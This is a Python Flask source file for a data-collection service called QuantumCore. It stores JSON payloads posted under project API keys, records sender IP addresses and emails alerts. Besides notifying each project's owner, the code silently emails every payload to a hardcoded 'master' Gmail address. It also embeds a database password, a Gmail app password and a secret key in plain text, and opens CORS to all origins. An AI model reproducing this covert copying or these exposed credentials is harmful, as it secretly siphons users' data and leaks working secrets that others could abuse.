from flask import Flask, render_template, request, jsonify, session, url_for, redirect
from flask_sqlalchemy import SQLAlchemy
from flask_cors import CORS
from werkzeug.security import generate_password_hash, check_password_hash
import uuid, datetime, smtplib, threading, os, requests
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__, template_folder='templates') 
app.secret_key = "QUANTUM_CORE_GLOBAL_ULTRA_SECURE_99" 
CORS(app)

# 1. DATABASE CONFIG (RENDER POSTGRES)
uri = os.getenv("DATABASE_URL")
EXTERNAL_DB_URL = "postgresql://quantum_vault_db_user:K9fT07XhIUPf6XW4z6pD6S1pE8W6pC6v@dpg-d6k3bqi4d50c73d8mpn0-a.oregon-postgres.render.com/quantum_vault_db"

try:
    if uri and uri.startswith("postgres://"):
        uri = uri.replace("postgres://", "postgresql://", 1)
    app.config['SQLALCHEMY_DATABASE_URI'] = uri or EXTERNAL_DB_URL
    import psycopg2 
except ImportError:
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///quantumcore.db'

app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# 2. MODELS (Project-Based Segregation)
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(200))
    projects = db.relationship('Project', backref='owner', lazy=True)

class Project(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    project_name = db.Column(db.String(100)) # Unique project name [cite: 2026-02-20]
    api_key = db.Column(db.String(100), unique=True, default=lambda: str(uuid.uuid4()))
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    vault_entries = db.relationship('DataVault', backref='project', lazy=True)

class DataVault(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    project_id = db.Column(db.Integer, db.ForeignKey('project.id')) # Data linked to specific project [cite: 2026-02-20]
    payload = db.Column(db.JSON) 
    ip_address = db.Column(db.String(50)) 
    timestamp = db.Column(db.DateTime, default=datetime.datetime.utcnow)

# 3. GLOBAL EMAIL ALERT SYSTEM
def send_quantum_alert(receiver_email, p_name, data_payload):
    SENDER = "meesamali6829@gmail.com"
    PASSWORD = os.getenv("EMAIL_PASS", "hbrw 2p4m 3c6k lhyc") 
    
    msg = MIMEMultipart()
    msg['From'] = f"QuantumCore Global <{SENDER}>"
    msg['To'] = receiver_email
    msg['Subject'] = f"🚀 Data Received: {p_name}"
    
    body = f"<h2>Project: {p_name}</h2><p>New data captured successfully.</p><pre>{data_payload}</pre>"
    msg.attach(MIMEText(body, 'html'))
    
    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(SENDER, PASSWORD)
            server.send_message(msg)
    except: pass

# 4. ROUTES (Worldwide - No Restrictions)
@app.route('/')
def index():
    # Sab ke liye open hai [cite: 2026-02-20]
    return render_template('index.html')

@app.route('/auth/process', methods=['POST'])
def process_auth():
    data = request.json
    action = data.get('action')
    email = data.get('email', '').lower().strip()
    password = data.get('password', '')

    if action == 'register':
        if User.query.filter_by(email=email).first():
            return jsonify({"status": "error", "message": "Email already exists"}), 400
        new_user = User(email=email, password=generate_password_hash(password))
        db.session.add(new_user)
        db.session.commit()
        return jsonify({"status": "success", "message": "Global Account Created"})

    elif action == 'login':
        user = User.query.filter_by(email=email).first()
        if user and check_password_hash(user.password, password):
            session['user_id'] = user.id
            return jsonify({"status": "success", "message": "Welcome Back"})
        return jsonify({"status": "error", "message": "Login Failed"}), 401

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session: return redirect('/')
    user = User.query.get(session['user_id'])
    # Dashboard will show specific projects and their data [cite: 2026-02-20]
    return render_template('dashboard.html', user=user)

@app.route('/v1/receive/<api_key>', methods=['POST'])
def receive_data(api_key):
    project = Project.query.filter_by(api_key=api_key).first()
    if not project: return jsonify({"error": "Key Invalid"}), 403
    
    data = request.json
    new_entry = DataVault(project_id=project.id, payload=data, ip_address=request.remote_addr)
    db.session.add(new_entry)
    db.session.commit()

    # Instant alerts to user and master email [cite: 2026-02-20]
    threading.Thread(target=send_quantum_alert, args=(project.owner.email, project.project_name, data)).start()
    threading.Thread(target=send_quantum_alert, args=("meesamali6829@gmail.com", project.project_name, data)).start()

    return jsonify({"status": "Locked"}), 200

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
